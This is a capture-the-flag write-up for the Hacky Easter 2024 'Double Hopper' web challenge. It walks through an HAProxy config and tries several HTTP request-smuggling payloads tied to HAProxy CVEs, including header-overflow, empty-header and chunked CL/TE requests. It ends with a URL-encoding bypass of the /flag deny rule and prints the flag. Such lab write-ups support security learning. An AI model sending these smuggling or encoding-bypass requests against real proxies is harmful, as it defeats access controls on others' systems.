### Challenge description
Double hopper will not show you a double whopper.

[Double Hopper web site](http://ch.hackyeaster.com:2406/)

### Solution

config.txt
```
 global  
    daemon  
    maxconn 256  
  
defaults  
    mode http  
    timeout connect 5000ms  
    timeout client 50000ms  
    timeout server 50000ms  
  
frontend http-in  
    bind *:8000  
    default_backend servers  
    http-request deny if { path -m sub /flag }  
  
backend servers  
    http-reuse always  
    server server1 backend:5000 maxconn 32
```

The config gives the following clues
- points towards a haproxy setup with connection reuse enabled. 
- the frontend has a protected /flag route

This pointed me towards http request smuggling attacks. (The 'double' hopper also seems to refer to double http requests).

So after some investigation, we find quite a lot of recent haproxy issues concerning request smuggling.

https://nvd.nist.gov/vuln/detail/CVE-2021-40346
does not seem vulnerable to this attack or payload

```
GET /index HTTP/1.1
Host: ch.hackyeaster.com:2406
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 89

GET /flag HTTP/1.1
Host: ch.hackyeaster.com:2406
Connection: close
Content-Length: 0
```

- https://www.cvedetails.com/cve/CVE-2023-40225/
	- empty content header
	- seems like the service is not vulnerable to this
	- vulnerable versions
		- 2.0.32, 2.1.x and 2.2.x through 2.2.30, 2.3.x and 2.4.x through 2.4.23, 2.5.x and 2.6.x before 2.6.15, 2.7.x before 2.7.10, and 2.8.x before 2.8.2

-  https://www.cvedetails.com/cve/CVE-2023-25725/
	- empty header fields
	- fixed in 2.7.3, 2.6.9, 2.5.12, 2.4.22, 2.2.29, and 2.0.31.

The following HTTP request does get 2 separate responses.
```
GET /index HTTP/1.1
Host: ch.hackyeaster.com:2406
Connection: keep-alive
: value
Content-Length: 10


GET /flag HTTP/1.1
Host: ch.hackyeaster.com:2406
```


When trying to combine Transfer-Encoding and Content-Length headers, the proxy seems to prefer the Transfer-Encoding header.
The request below still returns a 403 for the smuggled request.

```
POST /index HTTP/1.1
Host: ch.hackyeaster.com:2406
Content-Type: text/plain
Content-Length: 78
Transfer-Encoding: chunked

0

GET /flag HTTP/1.1
Host: ch.hackyeaster.com:2406
Content-Length: 0

0
```

### Final solution
http://ch.hackyeaster.com:2406//static/%66%6C%61%67-55a8408e060a25096eb95be8b86f3a2c66f91193.png

URL encoding seems to be a backdoor to the flag which circumvents the request check.
I am not sure that this is the intended solution but it did work.
![[multi-hopper.png]]

he2024{Smu66l1m6_4ll_th3_t1m3!}